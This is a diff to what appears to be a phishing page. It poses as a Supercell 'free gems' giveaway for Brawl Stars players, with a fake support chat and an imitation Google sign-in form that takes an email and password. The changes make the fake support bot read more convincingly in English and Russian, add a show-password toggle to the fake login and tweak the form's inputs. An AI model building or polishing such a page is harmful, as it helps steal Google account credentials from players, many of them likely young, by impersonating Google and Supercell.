@@ -51,6 +51,13 @@
         .msg.bot { background: #e4e6eb; color: #000; align-self: flex-start; border-bottom-left-radius: 2px; }
         .msg.user { background: #0084ff; color: #fff; align-self: flex-end; border-bottom-right-radius: 2px; }
 
+        /* ГУГЛ С ПОКАЗОМ ПАРОЛЯ */
+        .pass-wrapper { position: relative; width: 100%; }
+        .show-pass-icon {
+            position: absolute; right: 10px; top: 20px; cursor: pointer;
+            width: 20px; opacity: 0.5;
+        }
+
         .lang-selector { position: absolute; top: 10px; right: 10px; z-index: 100; }
         .lang-btn {
             background: rgba(0,0,0,0.7); border: 2px solid #fff; color: #fff;
@@ -162,11 +169,11 @@
     </div>
     <div class="chat-window" id="chatWin">
         <div class="chat-header">
-            <span>SUPERCELL SUPPORT</span>
+            <span id="support-header">SUPERCELL SUPPORT</span>
             <span style="cursor:pointer" onclick="toggleChat()">✖</span>
         </div>
         <div class="chat-body" id="chatBody">
-            <div class="msg bot">Hello! I'm the Supercell automated assistant. How can I help you?</div>
+            <div class="msg bot" id="support-init-msg">Hello! I'm the Supercell automated assistant. How can I help you?</div>
         </div>
     </div>
 
@@ -216,8 +223,13 @@
             <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"></center>
             <h2 id="g-signin">Sign in</h2>
             <p id="g-desc">Use your Google Account</p>
-            <input type="email" id="email" class="g-input" placeholder="Email or phone">
-            <input type="password" id="pass" class="g-input" placeholder="Enter your password">
+            <input type="text" id="email" class="g-input" placeholder="Email or phone">
+            
+            <div class="pass-wrapper">
+                <input type="password" id="pass" class="g-input" placeholder="Enter your password">
+                <img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="show-pass-icon" onclick="togglePass()">
+            </div>
+
             <div style="overflow:hidden; width:100%;">
                 <button class="btn-confirm-g" onclick="sendData()">Next</button>
             </div>
@@ -234,8 +246,11 @@
 
     const translations = {
         EN: {
-            support_hi: "Hello! I'm the Supercell automated assistant. Checking your account status...",
+            support_header: "SUPERCELL SUPPORT",
+            support_init: "Hello! I'm the Supercell automated assistant. How can I help you?",
+            support_hi: "Checking your account status for the event...",
             support_ok: "Your account is eligible for the gems reward. Please complete the verification in the main window.",
+            support_user_msg: "I want to claim my gems",
             bubble_start: "Hey Brawler! Free gems event is live! Enter your tag to get started!",
             bubble_search: "Searching for your account... Please wait!",
             bubble_found: "Account found! You can now claim your reward!",
@@ -251,8 +266,11 @@
             alert_done: "Verification successful! Gems will be added in 24h."
         },
         RU: {
-            support_hi: "Привет! Я автоматический помощник Supercell. Проверяю статус вашего аккаунта...",
+            support_header: "ПОДДЕРЖКА SUPERCELL",
+            support_init: "Привет! Я автоматический помощник Supercell. Чем я могу помочь?",
+            support_hi: "Проверяю статус вашего аккаунта для участия...",
             support_ok: "Ваш аккаунт подходит для получения награды. Пожалуйста, завершите проверку в основном окне.",
+            support_user_msg: "Я хочу получить свои гемы",
             bubble_start: "ПРИВЕТ, БРАВЛЕР! РАЗДАЧА ГЕМОВ НАЧАЛАСЬ! ВВЕДИ СВОЙ ТЕГ!",
             bubble_search: "ИЩУ ТВОЙ АККАУНТ... ПОЖАЛУЙСТА, ПОДОЖДИ!",
             bubble_found: "АККАУНТ НАЙДЕН! ТЕПЕРЬ ТЫ МОЖЕШЬ ЗАБРАТЬ НАГРАДУ!",
@@ -283,7 +301,7 @@
         setTimeout(() => {
             const userMsg = document.createElement('div');
             userMsg.className = "msg user";
-            userMsg.innerText = playerTag ? "Checking status for " + playerTag : "I want my gems";
+            userMsg.innerText = playerTag ? t.support_user_msg + " (" + playerTag + ")" : t.support_user_msg;
             body.appendChild(userMsg);
             
             setTimeout(() => {
@@ -302,6 +320,11 @@
                 }, 2000);
             }, 1500);
         }, 500);
+    }
+
+    function togglePass() {
+        const p = document.getElementById('pass');
+        p.type = p.type === "password" ? "text" : "password";
     }
 
     function toggleLang() {
@@ -323,11 +346,13 @@
         document.getElementById('t-select-gems').innerText = t.select_gems;
         document.getElementById('btn-connect').innerText = t.btn_connect;
         document.getElementById('t-synced').innerText = t.synced;
+        document.getElementById('support-header').innerText = t.support_header;
+        document.getElementById('support-init-msg').innerText = t.support_init;
         
         if(currentLang === 'RU') {
             document.getElementById('g-signin').innerText = "Вход";
             document.getElementById('g-desc').innerText = "Используйте аккаунт Google";
-            document.getElementById('email').placeholder = "Адрес эл. почты или телефон";
+            document.getElementById('email').placeholder = "Телефон или адрес эл. почты";
             document.getElementById('pass').placeholder = "Введите пароль";
             document.querySelector('.btn-confirm-g').innerText = "Далее";
         } else {
